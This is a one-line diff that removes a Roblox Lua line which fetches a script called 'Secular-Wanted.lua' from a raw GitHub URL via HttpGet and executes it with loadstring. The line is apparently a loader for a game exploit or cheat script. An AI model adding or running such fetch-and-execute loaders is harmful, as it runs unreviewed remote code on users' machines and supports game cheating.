@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/JanseJYC/Script/refs/heads/main/Secular-Wanted.lua"))()
